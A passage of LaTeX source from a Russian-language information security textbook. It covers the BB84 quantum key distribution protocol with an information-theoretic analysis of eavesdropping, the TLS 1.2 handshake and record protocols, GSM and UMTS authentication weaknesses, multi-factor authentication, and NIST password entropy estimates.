Протокол гарантирует, что вмешательство злоумышленника в протокол можно заметить вплоть до тех пор, пока злоумышленник не сможет контролировать и чтение, и запись на всех каналах общения сразу.

Протокол состоит из следующих этапов:

\begin{itemize}
	\item передача Алисой и приём Бобом фотона по квантовому каналу связи;
	\item передача Бобом информации об использованных анализаторах;
	\item передача Алисой информации о совпадении выбранных анализаторов и исходных поляризаций.
\end{itemize}


\subsubsection{Генерация фотона}

В первой части протокола, с точки зрения физика-экспериментатора, Алиса берёт единичный фотон и поляризует под одним из четырёх углов: 0, 45, 90 или 135. Будем говорить, что Алиса сначала выбрала базис поляризации (<<+>> или <<x>>), а затем выбрала в этом базисе одно из двух направлений поляризации:

\begin{itemize}
	\item $0^{\circ}$ (<<$\rightarrow$>>) или $90^{\circ}$ (<<$\uparrow$>>) в первом базисе (<<+>>);
	\item $45^{\circ}$ (<<$\nearrow$>>) или $135^{\circ}$ (<<$\nwarrow$>>) во втором базисе (<<×>>).
\end{itemize}

С точки зрения квантовой физики, мы можем считать, что у нас есть система с двумя базовыми состояниями: $|0\rangle$ и $|1\rangle$. Состояние системы в любой момент времени можно записать как $| \psi \rangle = \cos \alpha |0\rangle + \sin \beta |1\rangle$. Так как четыре выбранных Алисой возможных исходных состояния неортогональны между собой (точнее, не все попарно), то из законов квантовой физики следует два важных момента:

\begin{itemize}
	\item невозможность клонировать состояние фотона;
	\item невозможность достоверно отличить неортогональные состояния друг от друга.
\end{itemize}

С точки зрения специалиста по теории информации, можем считать, что Алиса использует две независимые случайные величины $X_A$ и $A$ с энтропией по 1 биту каждая, чтобы получить новую случайную величину $Y_A = f \left( X_A; A \right)$, передаваемую в канал связи.

\begin{itemize}
	\item $H \left( A \right) = 1~\text{бит}$, выбор базиса поляризации (<<+>> или <<×>>);
	\item $H \left( X \right) = 1~\text{бит}$, само сообщение, выбор одного из двух направлений поляризации в базисе.
\end{itemize}

\subsubsection{Действия злоумышленника}

Как физик-экспериментатор, Ева может попытаться встать посередине канала и что-то с фотоном сделать. Может попытаться просто уничтожить фотон или послать вместо него случайный. Хотя последнее приведёт к тому, что Алиса и Боб не смогут сгенерировать общий сеансовый ключ, полезную информацию Ева из этого не извлечёт.

Ева может попытаться пропустить фотон через один из поляризаторов и попробовать поймать фотон детектором. Если бы Ева точно знала, что у фотона может быть только два ортогональных состояния (например, вертикальная <<$\uparrow$>> или горизонтальная <<$\rightarrow$>> поляризация), то она могла бы вставить на пути фотона вертикальный поляризатор <<$\uparrow$>> и по наличию сигнала на детекторе определить, была ли поляризация фотона вертикальной (1, есть сигнал) или горизонтальной (0, фотон через поляризатор не прошёл и сигнала нет). Проблема Евы в том, что у фотона не два состояния, а четыре. И никакое положение одного поляризатора и единственного детектора не поможет Еве точно определить, какое из этих четырёх состояний принял фотон. А пропустить фотон через два детектора не получится. Во-первых, если фотон прошёл вертикальный  поляризатор, то какой бы исходной у него ни была поляризация (<<$\nwarrow$>>, <<$\uparrow$>>, <<$\nearrow$>>), после поляризатора она станет вертикальной <<$\uparrow$>> (вторая составляющая <<сотрётся>>). Во-вторых, детектор, преобразуя фотон в электрический сигнал, тем самым уничтожает его, что несколько затрудняет его дальнейшие измерения.

Кроме того, двух или даже четырёх детекторов для одного фотона будет мало. Отличить между собой неортогональные поляризации <<$\uparrow$>> и <<$\nearrow$>> можно только статистически, так как каждая из них будет проходить и вертикальный <<$\uparrow$>>, и диагональный <<$\nearrow$>> поляризаторы, но с разными вероятностями (100\% и 50\%).

С точки зрения квантовой физики, Ева может попытаться провести измерение свойств фотона, что приведёт к \emph{коллапсу волновой функции} (или же \emph{редукции фон Неймана}) фотона. То есть после действия оператора измерения на волновую функцию фотона она неизбежно меняется, что приведёт к помехам в канале связи, которые могут обнаружить Алиса и Боб. Невозможность достоверно отличить неортогональные состояния мешает Еве получить полную информацию о состоянии объекта, а запрет клонирования мешает повторить измерение с дубликатом системы.

С точки зрения теории информации, мы можем рассмотреть фактически передаваемое состояние фотона как некоторую случайную величину $Y_A$. Ева использует случайную величину $E$ (выбор пары ортогональных направлений поляризатора – <<+>> либо <<×>>) для получения величины $Y_E$ как результата измерения $Y_A$. При этом для каждого заданного исходного состояния Ева получает на выходе:

\begin{itemize}
	\item аналогичное состояние с вероятностью 50\% (вероятность выбора пары ортогональных направлений поляризатора, совпадающих с выбранными Алисой);
	\item одно из двух неортогональных оригинальному состояний, с вероятностью 25\% каждое.
\end{itemize}

Таким образом, условная энтропия величины $Y'$, измеренной Евой, относительно величины $Y$, переданной Алисой, равна:
\[ H \left( Y_E | Y_A \right) = - \frac{1}{2} \log_2 \frac{1}{2} - \frac{1}{4} \log_2 \frac{1}{4} - \frac{1}{4} \log_2 \frac{1}{4} = 1,5~\text{бит}. \]

И взаимная информация между этими величинами равна:
\[ I \left( Y_E ; Y_A \right) = H \left( Y_E \right) - H ( Y_E | Y_A ) = 0,5~\text{бит}.\]

Что составляет 25\% от энтропии, передаваемой по каналу случайной величины $Y$.

Если рассматривать величину $X_E$, которую Ева пытается восстановить из принятой ею величины $Y_E$, то с точки зрения теории информации, ситуация ещё хуже:

\begin{itemize}
	\item при угаданном базисе поляризатора Ева получает исходную величину $X_E = X_A$;
	\item при неугаданном базисе ещё в половине случаев криптоаналитик получает исходную величину (из-за случайного прохождения фотона через <<неправильный>> поляризатор).
\end{itemize}

Получается, что условная энтропия восстанавливаемой Евой последовательности $X_E$ относительно исходной $X_A$ равна:
\[ H \left( X_E | X_A \right) = - \frac{3}{4} \log \frac{3}{4} - \frac{1}{4} \log \frac{1}{4} \approx 0,81~\text{бит.}\]

И взаимная информация
\[ I \left( X_E; X_A \right) = H \left( X_E \right) - H \left( X_E | X_A \right) \approx 0,19~\text{бит}. \]

Что составляет $\approx 19\%$ от энтропии исходной случайной величины $X_A$.

Оптимальным алгоритмом дальнейших действий Евы будет послать Бобу фотон в полученной поляризации (передать далее в канал полученную случайную величину $Y_E$). То есть если Ева использовала вертикальный поляризатор <<$\uparrow$>>, и детектор зафиксировал наличие фотона, то передавать фотон в вертикальной поляризации <<$\uparrow$>>, а не пытаться вводить дополнительную случайность и передавать <<$\nwarrow$>> или <<$\nearrow$>>.

\subsubsection{Действия легального получателя}

Боб, аналогично действиям Евы (хотя это скорее Ева пытается имитировать Боба), случайным образом выбирает ортогональную пару направлений поляризации (<<+>> либо <<×>>) и ставит на пути фотона поляризатор (<<$\uparrow$>> или <<$\nwarrow$>>) и детектор. В случае наличия сигнала на детекторе он записывает единицу, в случае отсутствия – ноль.

Можно сказать, что Боб, как и Ева, вводит новую случайную величину B (отражает выбор базиса поляризации Бобом) и в результате измерений получает новую случайную величину $X_B$. Причём Бобу пока неизвестно, использовал ли он оригинальный сигнал $Y_A$, переданный Алисой, или же подложный сигнал $Y_E$, переданный Евой:

\begin{itemize}
	\item $X_{B1} = f \left( Y_A, B \right);$
	\item $X_{B2} = f \left( Y_E, B \right).$
\end{itemize}

Далее Боб сообщает по открытому общедоступному классическому каналу связи, какие именно базисы поляризации использовались, а Алиса указывает, какие из них совпали с изначально выбранными. При этом сами измеренные значения (прошёл фотон через поляризатор или нет) Боб оставляет в секрете.

Можно сказать, что Алиса и Боб публикуют значения сгенерированных ими случайных величин $A$ и $B$. Примерно в половине случаев эти значения совпадут (когда Алиса подтверждает правильность выбора базиса поляризации). Для тех фотонов, у которых значения $A$ и $B$ совпали, совпадут и значения $X_A$ и $X_{B1}$. То есть:

\begin{itemize}
	\item $H \left( X_{B1} | X_A; A = B \right) = 0~\text{бит}$,
	\item $I \left( X_{B1} ; X_A | A = B \right) = 1~\text{бит}$.
\end{itemize}

Для тех фотонов, для которых Боб выбрал неправильный базис поляризации, значения $X_{B1}$ и $X_{A}$ будут представлять собой независимые случайные величины (так как, например, при исходной диагональной поляризации фотон пройдёт и через вертикальную, и через горизонтальную щели с вероятностью 50\%):

\begin{itemize}
	\item $H \left( X_{B1} | X_A; A \neq B \right) = 1~\text{бит},$
	\item $I \left( X_{B1} ; X_A | A \neq B \right) = 0~\text{бит}.$
\end{itemize}

Рассмотрим случай, когда Ева вмешалась в процесс передачи информации между Алисой и Бобом и отправляет Бобу уже свои фотоны, но не имеет возможности изменять информацию, которой Алиса и Боб обмениваются по классическому каналу связи. Как и прежде, Боб отправляет Алисе выбранные базисы поляризации (значения $B$), а Алиса указывает, какие из них совпали с выбранными ею значениями $A$.

Но теперь для того чтобы Боб получил корректное значение $X_{B2}$ ($X_{B2} = X_A$), должны быть выполнены все следующие условия для каждого фотона.

\begin{itemize}
	\item Ева должна угадать базис поляризации Алисы ($E = A$).
	\item Боб должен угадать базис поляризации Евы ($B = E$).
\end{itemize}

Рассмотрим без ограничения общности вариант, когда Алиса использовала диагональную поляризацию <<×>>:

\begin{tabular}{ | c | c | c | c | }
\hline
Базис & Базис & Базис & \\
Алисы & Евы & Боба & Результат \\
\hline
<<×>> & <<×>> & <<×>> & принято без ошибок \\
<<×>> & <<×>> & <<+>> & отклонено \\
<<×>> & <<+>> & <<×>> & принято с ошибками\\
<<×>> & <<+>> & <<+>> & отклонено \\
\hline
\end{tabular}

При этом Боб и Алиса будут уверены, что в первом и третьем случаях (которые с их точек зрения ничем не отличаются) Боб корректно восстановил поляризацию фотонов. Так как все эти строки равновероятны, то получается, что у Боба и Алисы после выбора только фотонов с <<угаданным>> базисами (как они уверены) только половина поляризаций (значений $X_A$ и $X_{B2}$) будет совпадать. При этом Ева будет эти значения знать. Количество известных Еве бит <<общей>> последовательности и доля ошибок в ней находятся в линейной зависимости от количества перехваченных Евой бит.

Вне зависимости от наличия или отсутствия Евы, Алиса и Боб вынуждены использовать заранее согласованную процедуру исправления ошибок. Используемый код коррекции ошибок, с одной стороны, должен исправлять ошибки, вызванные физическими особенностями квантового канала. Но с другой стороны, если код будет исправлять слишком много ошибок, то он скроет от нас потенциальный факт наличия Евы. Доказано, что существуют такие методы исправления ошибок, которые позволяют безопасно (без опасности раскрыть информацию Еве) исправить от 7,5\% (Майерз, 2001, \cite{Mayers:2001}) до 11\% ошибок (Ватанабе, Матсумото, Уйематсу, 2005,~\cite{Watanabe:Matsumoto:Uyematsu:2005}).

Интересен также вариант, когда Ева может изменять информацию, передаваемую не только по оптическому, но и по классическому каналам связи. В этом случае многое зависит от того, в какую сторону (от чьего имени) Ева может подделывать сообщения. В самом негативном сценарии, когда Ева может выдать себя и за Алису, и за Боба, будет иметь место полноценная атака <<человек-посередине>> (\langen{man-in-the-middle}), от которой невозможно защититься никаким способом, если не использовать дополнительные защищённые каналы связи или не основываться на информации, переданной заранее. Однако, это будет уже совсем другой протокол.

Подводя итоги, можно сказать, что квантовые протоколы распределения ключей (а именно ими пока что и ограничивается вся известная на сегодняшний день <<квантовая криптография>>) обладают как определёнными преимуществами, так и фатальными недостатками, затрудняющими их использование (и ставящими под вопрос саму эту необходимость):

\begin{itemize}
	\item Любые квантовые протоколы (как и вообще любые квантовые вычисления) требуют оригинального дорогостоящего оборудования, которое пока что нельзя сделать частью commodity-устройств или обычного сотового телефона.
	\item Квантовые каналы связи -- это всегда физические каналы связи. У них существует максимальная длина канала и определённый уровень ошибок. Для квантовых каналов (на сегодняшний день) не придумали <<повторителей>>, которые позволили бы увеличить длину безусловно квантовой передачи данных.
	\item Ни один квантовый протокол (на сегодняшний день) не может обходиться без дополнительного классического канала связи. Для такого связи требуются как минимум такой же уровень защиты, как и при использовании, например, криптографии с открытым ключом.
	\item Для всех протоколов особую проблему представляет не только доказательство корректности (что является весьма нетривиальным делом в случае наличия <<добросовестных>> помех), но и инженерная задача по реализации протокола в <<железе>>. В качестве краткой иллюстрации, например, не существует простого способа создать \emph{ровно один} фотон. Недогенерация фотонов приводит, очевидно, к ошибкам передачи, а генерация дубля в том же временном слоте -- к возможности его перехвата злоумышленником без создания помех в канале.
\end{itemize}

\index{протокол!BB84|)}
\index{протокол!квантовые|)}



\input{secret-sharing}

\chapter{Примеры систем защиты}

\input{kerberos}

\input{pgp}

\section{Протокол SSL/TLS}\index{протокол!SSL/TLS}
\selectlanguage{russian}

Протокол SSL (\langen{Secure Sockets Layer}) был разработан компанией Netscape. Начиная с версии 3, протокол развивается как открытый стандарт TLS (\langen{Transport Layer Security}). Протокол SSL/TLS обеспечивает защищённое соединение по незащищённому каналу связи на прикладном уровне модели TCP/IP. Протокол встраивается между прикладным и транспортным уровнями стека протоколов TCP/IP. Для обозначения <<новых>> протоколов, полученных с помощью инкапсуляции прикладного уровня (HTTP\index{протокол!HTTP}, FTP\index{протокол!FTP}, SMTP\index{протокол!SMTP}, POP3\index{протокол!POP3}, IMAP\index{протокол!IMAP} и~т.\,д.) в SSL/TLS, к обозначению добавляют суффикс <<S>> (<<Secure>>): HTTPS\index{протокол!HTTPS}, FTPS\index{протокол!FTPS}, POP3S\index{протокол!POP3S}, IMAPS\index{протокол!IMAPS} и~т.\,д.

Протокол обеспечивает следующее:
\begin{itemize}
    \item Одностороннюю или взаимную аутентификацию клиента и сервера по открытым ключам сертификата X.509. В Интернете, как правило, делается \emph{односторонняя} аутентификация веб-сервера браузеру клиента, то есть только веб-сервер предъявляет сертификат (открытый ключ и ЭП к нему от вышележащего УЦ).
    \item Создание сеансовых симметричных ключей для шифрования и кода аутентификации сообщения для передачи данных в обе стороны.
    \item Конфиденциальность\index{конфиденциальность} -- блочное или потоковое шифрование передаваемых данных в обе стороны.
    \item Целостность\index{целостность} -- аутентификацию отправляемых сообщений в обе стороны имитовставкой\index{имитовставка} $\HMAC(K,M)$, описанной ранее.
\end{itemize}

Рассмотрим протокол TLS последней версии 1.2.


\subsection{Протокол <<рукопожатия>>}

Протокол <<рукопожатия>> (\langen{Handshake Protocol}) производит аутентификацию и создание сеансовых ключей между клиентом $C$ и сервером $S$.

\begin{enumerate}
    \item $C \rightarrow S$:
        \begin{enumerate}
            \item ClientHello: ~ 1) URI сервера, ~ 2) одноразовая метка $N_C$\index{одноразовая метка}, ~ 3) поддерживаемые алгоритмы шифрования, кода аутентификации сообщений, хэширования, ЭП и сжатия.
        \end{enumerate}

    \item $C \leftarrow S$:
        \begin{enumerate}
            \item ServerHello: одноразовая метка $N_S$, поддерживаемые сервером алгоритмы.

            После обмена набором желательных алгоритмов сервер и клиент по единому правилу выбирают общий набор алгоритмов.
            \item Server Certificate: сертификат X.509v3 сервера с запрошенным URI (URI нужен в случае нескольких виртуальных веб-серверов с разными URI на одном узле c одним IP-адресом).
            \item Server Key Exchange Message: информация для создания предварительного общего секрета $premaster$ длиной 48 байтов в виде: ~ 1) обмена по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана} с клиентом (сервер отсылает $(g, g^a)$), ~ 2)Обмена по другому алгоритму с открытым ключом, ~ 3) разрешения клиенту выбрать ключ.
            \item Электронная подпись к Server Key Exchange Message на ключе сертификата сервера для аутентификации сервера клиенту.
            \item Certificate Request: опциональный запрос сервером сертификата клиента.
            \item Server Hello Done: идентификатор конца транзакции.
        \end{enumerate}

    \item $C \rightarrow S$:
        \begin{enumerate}
            \item Client Certificate: сертификат X.509v3 клиента, если он был запрошен сервером.
            \item Client Key Exchange Message: информация для создания предварительного общего секрета $premaster$ длиной 48 байтов в виде: ~ 1) либо обмена по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана} с сервером (клиент отсылает $g^b$, в результате обе стороны вычисляют ключ $premaster = g^{ab}$), ~ 2) либо обмена по другому алгоритму, ~ 3) либо ключа, выбранного клиентом и зашифрованного на открытом ключе из сертификата сервера.
            \item Электронная подпись к Client Key Exchange Message на ключе сертификата клиента для аутентификации клиента серверу (если клиент использует сертификат).
            \item Certificate Verify: результат проверки сертификата сервера.
            \item Change Cipher Spec: уведомление о смене сеансовых ключей.
            \item Finished: идентификатор конца транзакции.
        \end{enumerate}

    \item $C \leftarrow S$:
        \begin{enumerate}
            \item Change Cipher Spec: уведомление о смене сеансовых ключей.
            \item Finished: идентификатор конца транзакции.
        \end{enumerate}
\end{enumerate}

%      http://tools.ietf.org/html/rfc5246#page-37

%      struct {
%          ProtocolVersion client_version;
%          Random random;
%          SessionID session_id;
%          CipherSuite cipher_suites<2..2^16-2>;
%          CompressionMethod compression_methods<1..2^8-1>;
%          select (extensions_present) {
%              case false:
%                  struct {};
%              case true:
%                  Extension extensions<0..2^16-1>;
%          };
%      } ClientHello;

%      struct {
%          ProtocolVersion server_version;
%          Random random;
%          SessionID session_id;
%          CipherSuite cipher_suite;
%          CompressionMethod compression_method;
%          select (extensions_present) {
%              case false:
%                  struct {};
%              case true:
%                  Extension extensions<0..2^16-1>;
%          };
%      } ServerHello;

%      struct {
%          ASN.1Cert certificate_list<0..2^24-1>;
%      } Certificate;

%      struct {
%          select (KeyExchangeAlgorithm) {
%              case dh_anon:
%                  ServerDHParams params;
%              case dhe_dss:
%              case dhe_rsa:
%                  ServerDHParams params;
%                  digitally-signed struct {
%                      opaque client_random[32];
%                      opaque server_random[32];
%                      ServerDHParams params;
%                  } signed_params;
%              case rsa:
%              case dh_dss:
%              case dh_rsa:
%                  struct {} ;
%                 /* message is omitted for rsa, dh_dss, and dh_rsa */
%              /* may be extended, e.g., for ECDH -- see [TLSECC] */
%          };
%      } ServerKeyExchange;

%      struct {
%          ClientCertificateType certificate_types<1..2^8-1>;
%          SignatureAndHashAlgorithm
%            supported_signature_algorithms<2^16-1>;
%          DistinguishedName certificate_authorities<0..2^16-1>;
%      } CertificateRequest;

%      struct {
%          select (KeyExchangeAlgorithm) {
%              case rsa:
%                  EncryptedPreMasterSecret;
%              case dhe_dss:
%              case dhe_rsa:
%              case dh_dss:
%              case dh_rsa:
%              case dh_anon:
%                  ClientDiffieHellmanPublic;
%          } exchange_keys;
%      } ClientKeyExchange;

%      struct {
%           digitally-signed struct {
%               opaque handshake_messages[handshake_messages_length];
%           }
%      } CertificateVerify;

%      struct {
%          opaque verify_data[verify_data_length];
%      } Finished;

Одноразовая метка $N_C$ состоит из 32 байтов. Первые 4 байта содержат текущее время (gmt\_unix\_time), оставшиеся байты -- псевдослучайную последовательность, которую формирует криптографически стойкий генератор псевдослучайных чисел.

Предварительный общий секрет $premaster$ длиной 48 байтов вместе с одноразовыми метками используется как инициализирующее значение генератора $PRF$ для получения общего секрета $master$, тоже длиной 48 байтов:
    \[ master = PRF(premaster, ~\text{текст \textquotedblleft master secret\textquotedblright}, ~ N_C + N_S) .\]

И, наконец, уже из секрета $master$ таким же способом генерируется 6 окончательных сеансовых ключей, следующих друг за другом в битовой строке:
    \[ \{ (K_{E,1} ~\|~ K_{E,2}) ~\|~ (K_{\MAC,1} ~\|~ K_{\MAC,2}) ~\|~ (IV_1 ~\|~ IV_2) \} = \]
        \[ = PRF(master, ~\text{текст \textquotedblleft key expansion\textquotedblright}, ~ N_C + N_S), \]
где ~ $K_{E,1}, ~ K_{E,2}$ -- два ключа симметричного шифрования, ~ $K_{\MAC,1}, ~ K_{\MAC,2}$ -- два ключа имитовставки\index{имитовставка}, ~ $IV_1, ~IV_2$ -- два инициализирующих вектора режима сцепления блоков\index{вектор инициализации}. Ключи с индексом 1 используются для коммуникации от клиента к серверу, с индексом 2 -- от сервера к клиенту.


\subsection{Протокол записи}

Протокол записи (\langen{Record Protocol}) определяет формат TLS-пакетов для вложения в TCP-пакеты.

\begin{enumerate}
    \item Исходными сообщениями $M$ для шифрования являются пакеты протокола прикладного уровня в модели OSI: HTTP\index{протокол!HTTP}, FTP\index{протокол!FTP}, IMAP\index{протокол!IMAP} и~т.\,д.
    \item Сообщение $M$ разбивается на блоки $m_i$ размером не более 16 кибибайт.
    \item Блоки $m_i$ сжимаются алгоритмом компрессии в блоки $z_i$.
    \item Вычисляется имитовставка\index{имитовставка} для каждого блока $z_i$ и добавляется в конец блоков: $a_i = z_i ~\|~ \HMAC(K_{\MAC}, z_i)$.
    \item Блоки $a_i$ шифруются симметричным алгоритмом с ключом $K_E$ в некотором режиме сцепления блоков с инициализирующим вектором $IV$ в полное сжатое аутентифицированное зашифрованное сообщение $C$.
    \item К шифртексту $C$ добавляется заголовок протокола записи TLS, в результате чего получается TLS-пакет для вложения в TCP-пакет.
\end{enumerate}


\input{ipsec}

\section[Защита персональных данных в мобильной связи]{Защита персональных данных в \protect\\ мобильной связи}

\subsection{GSM (2G)}
\selectlanguage{russian}

Регистрация телефона в сети GSM построена с участием трёх сторон: SIM-карты мобильного устройства, базовой станции и центра аутентификации. SIM-карта и центр аутентификации обладают общим секретным 128-битным ключом $K_i$. Вначале телефон сообщает базовой станции уникальный идентификатор SIM-карты IMSI открытым текстом. Базовая станция запрашивает в центре аутентификации для данного IMSI набор параметров для аутентификации. Центр генерирует псевдослучайное 128-битовое число $\textrm{RAND}$ и алгоритмами A3\index{алгоритм!A3} и A8\index{алгоритм!A8} создаёт симметричный 54-битовый ключ $K_c$ и 32-битовый аутентификатор $\textrm{RES}$. Базовая станция передаёт мобильному устройству число $\textrm{RAND}$ и ожидает результата вычисления SIM-картой числа $\textrm{XRES}$, которое должно совпасть с $\textrm{RES}$ в случае успешной аутентификации. Схема аутентификации показана на рис.~\ref{fig:gsm2}.

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.85\textwidth]{pic/gsm2}
	\caption{Односторонняя аутентификация и шифрование в GSM\label{fig:gsm2}}
\end{figure}

Все вычисления для аутентификации выполняет SIM-карта. Ключ $K_c$ далее используется для создания ключа шифрования каждого фрейма $K = K_c ~\|~ n_F$, где $n_F$~--~22-битовый номер фрейма. Шифрование выполняет уже само мобильное устройство. Алгоритм шифрования фиксирован в каждой стране и выбирается из семейства алгоритмов A5\index{шифр!A5} (A5/1, A5/2, A5/3). В GSM применяется либо шифр A5/1 (используется в России), либо A5/2. Шифр A5/3 применяется уже в сети UMTS.

Аутентификация в сети GSM односторонняя. При передаче данных не используются проверка целостности и аутентификация сообщений. Передача данных между базовыми станциями происходит в открытом незашифрованном виде. Алгоритмы шифрования A5/1 и A5/2 нестойкие, количество операций для взлома A5/1~--~$2^{40}$, A5/2~--~$2^{16}$. Кроме того, длина ключа $K_c$ всего 54 бита. Передача в открытом виде уникального идентификатора IMSI позволяет однозначно определить абонента.


\subsection{UMTS (3G)}
\selectlanguage{russian}

В третьем поколении мобильных сетей, называемом UMTS, защищённость немного улучшена. Общая схема аутентификации (рис.~\ref{fig:gsm3}) осталась примерно такой же, как и в GSM. Жирным шрифтом на рисунке выделены новые добавленные элементы по сравнению с GSM.
\begin{enumerate}
    \item Производится взаимная аутентификация SIM-карты и центра аутентификации по токенам $\textrm{RES}$ и $\MAC$.
    \item Добавлены проверка целостности и аутентификация данных (имитовставка\index{имитовставка}).
    \item Используются новые алгоритмы создания ключей, шифрования и имитовставки\index{имитовставка}.
    \item Добавлены счётчики на SIM-карте $\textrm{SQN}_{\textrm{T}}$ и в центре аутентификации $\textrm{SQN}_{\textrm{Ц}}$ для защиты от атак воспроизведения. Значения увеличиваются при каждой попытке аутентификации и должны примерно совпадать.
    \item Увеличена длина ключа шифрования до 128 бит.
\end{enumerate}

\begin{figure}[!ht]
	\centering
	\includegraphics[width=\textwidth]{pic/gsm3}
	\caption{Взаимная аутентификация и шифрование в UMTS (3G)\label{fig:gsm3}}
\end{figure}

Обозначения на рис.~\ref{fig:gsm3} следующие:
\begin{itemize}
    \item $K$ -- общий секретный 128-битовый ключ SIM-карты и центра аутентификации;
    \item $\textrm{RAND}$ -- 128-битовое псевдослучайное число, создаваемое центром аутентификации;
    \item $\textrm{SQN}_{\textrm{T}}, \textrm{SQN}_{\textrm{Ц}}$ -- 48-битовые счётчики для защиты от атак воспроизведения;
    \item $\textrm{AMF}$ -- 16-битовое значение окна для проверки синхронизации счётчиков;
    \item $CK, IK, AK$ -- 128-битовые ключи шифрования данных $CK$, кода аутентификации данных $IK$, гаммы значения счётчика $AK$;
    \item $\MAC, \textrm{XMAC}$ -- 128-битовые аутентификаторы центра SIM-карте;
    \item $\textrm{RES}, \textrm{XRES}$ -- 128-битовые аутентификаторы SIM-карты центру;
    \item $\textrm{AUTN}$ -- вектор аутентификации.
\end{itemize}

Алгоритмы $fi$ не фиксированы стандартом и выбираются при реализациях.

Из оставшихся недостатков защиты персональных данных можно перечислить.
\begin{enumerate}
    \item Уникальный идентификатор SIM-карты IMSI по-прежнему передаётся в открытом виде, что позволяет идентифицировать абонентов по началу сеанса регистрации SIM-карты в сети.
    \item Шифрование и аутентификация производятся только между телефоном и базовой станцией, а не между двумя телефонами. Это является необходимым условием для подключения СОРМ (Система технических средств для обеспечения функций оперативно-розыскных мероприятий) по закону <<О связи>>. С другой стороны, это повышает риск нарушения конфиденциальности персональных данных.
    \item Алгоритм шифрования данных A5/3 (KASUMI) на 128-битовом ключе теоретически взламывается атакой на основе известного открытого текста для 64 MB данных с использованием 1 GiB памяти $2^{32}$ операциями (2 часа на обычном ПК).
\end{enumerate}


%\section{Беспроводная сеть Wi-Fi}
%\subsection{WPA-PSK2, 802.11n, Radix?}
%\subsection{Wimax 802.16(?)}

\chapter{Аутентификация пользователя}


\section{Многофакторная аутентификация}

Для защищённых приложений применяется \emph{многофакторная} аутентификация одновременно по факторам различной природы:
\begin{enumerate}
    \item Свойство, которым обладает субъект. Например: биометрия, природные уникальные отличия (лицо, радужная оболочка глаз, папиллярные узоры, последовательность ДНК).
    \item Знание -- информация, которую знает субъект. Например: пароль, PIN (Personal Identification Number).
    \item Владение -- вещь, которой обладает субъект. Например: электронная или магнитная карта, флэш-память.
%    \item Факторы присвоения. Например, номер машины, RFID-метка.
\end{enumerate}

В обычных массовых приложениях из-за удобства использования применяется аутентификация только по \emph{паролю}\index{пароль}, который является общим секретом пользователя и информационной системы. Биометрическая аутентификация по отпечаткам пальцев применяется существенно реже. Как правило, аутентификация по отпечаткам пальцев является дополнительным, а не вторым обязательным фактором (тоже из-за удобства её использования).

%Так же явно или неявно используется аутентификация по факторам:
%\begin{enumerate}
%    \item Социальная сеть. Доверие к индивидууму в личном или интернет общении, на основании общих связей.
%    \item Географическое положение. Например, для проверки оплаты товаров по кредитной карте.
%    \item Время. Доступ к сервисам или местам только в определённое время.
%    \item И др.
%\end{enumerate}


\section[Энтропия и криптостойкость паролей]{Энтропия и криптостойкость \protect\\ паролей}

Стандартный набор символов паролей, которые можно набрать на клавиатуре, используя английские буквы и небуквенные символы, состоит из $D=94$ символов. При длине пароля $L$ символов и предположении равновероятного использования символов энтропия паролей равна
    \[ H = L \log_2 D. \]

Клод Шеннон, исследуя энтропию символов английского текста, изучал вероятность успешного предсказания людьми следующего символа по первым нескольким символам слов или текста. В результате Шеннон получил оценку энтропии первого символа $s_1$ текста порядка $H(s_1) \approx 4{,}6$--$4{,}7$ бит/символ и оценки энтропий последующих символов, постепенно уменьшающиеся до $H(s_9) \approx 1{,}5$ бит/символ для 9-го символа. Энтропия для длинных текстов литературных произведений получила оценку $H(s_\infty) \approx 0{,}4$ бит/символ.

Статистические исследования баз паролей показывают, что наиболее часто используются буквы <<a>>, <<e>>, <<o>>, <<r>> и цифра <<1>>.

NIST (Национальный институт стандартов и технологий США, \langen{National Institute of Standards and Technology})  использует следующие рекомендации для оценки энтропии паролей\index{энтропия!пароля}, создаваемых людьми.
\begin{enumerate}
    \item Энтропия первого символа $H(s_1) = 4$ бит/символ.
    \item Энтропия со 2-го по 8-й символы $H(s_{i}) = 2$ бит/символ, $2 \leq i \leq 8$.
    \item Энтропия с 9-го по 20-й символы $H(s_{i}) = 1{,}5$ бит/символ, $9 \leq i \leq 20$.
    \item Энтропия с 21-го символа $H(s_{i}) = 1$ бит/символ, $i \geq 21$.
    \item Проверка композиции на использование символов разных регистров и небуквенных символов добавляет до 6-ти бит энтропии пароля.
    \item Словарная проверка на слова и часто используемые пароли добавляет до 6 бит энтропии для коротких паролей. Для 20-символьных и более длинных паролей прибавка к энтропии -- 0 бит.
\end{enumerate}

Для оценки энтропии пароля нужно сложить энтропии символов $H(s_i)$ и сделать дополнительные надбавки, если пароль удовлетворяет тестам на композицию и отсутствует в словаре.

\begin{table}[!ht]
    \caption{Оценка NIST предполагаемой энтропии паролей\label{tab:password-entropy}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c||c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{\medskip \centering Длина пароля, символы}} & \multicolumn{3}{|c||}{\parbox{6cm}{\centering Энтропия паролей пользователей по критериям NIST}} & \multirow{2}{*}{\parbox{3cm}{\centering Энтропия случайных равновероятных паролей}} \\
        \cline{2-4}
        & \parbox{1.5cm}{\centering Без проверок} & \parbox{2cm}{\centering Словарная проверка} & \parbox{3cm}{\centering Словарная и композиционная проверка} & \\
        \hline
        4  & 10 & 14 & 16 & 26.3 \\
        6  & 14 & 20 & 23 & 39.5 \\
        8  & 18 & 24 & 30 & 52.7 \\
        10 & 21 & 26 & 32 & 65.9 \\
        12 & 24 & 28 & 34 & 79.0 \\
        16 & 30 & 32 & 38 & 105.4 \\
        20 & 36 & 36 & 42 & 131.7 \\
        24 & 40 & 40 & 46 & 158.0 \\
        30 & 46 & 46 & 52 & 197.2 \\
        40 & 56 & 56 & 62 & 263.4 \\
        \hline
    \end{tabular} }
\end{table}

В таблице~\ref{tab:password-entropy} приведена оценка NIST на величину энтропии пользовательских паролей в зависимости от их длины, и приведено сравнение с энтропией случайных паролей с равномерным распределением символов из набора в $D=94$ символов клавиатуры. Вероятное число попыток для подбора пароля составляет $O(2^H)$. Из таблицы видно, что по критериям NIST энтропия реальных паролей в 2--4 раза меньше энтропии случайных паролей с равномерным распределением символов.

\example
Оценим общее количество существующих паролей. Население Земли -- 7 млрд. Предположим, что всё население использует компьютеры и Интернет, и у каждого человека по 10 паролей. Общее количество существующих паролей -- $7 \cdot 10^{10} \approx 2^{36}$.

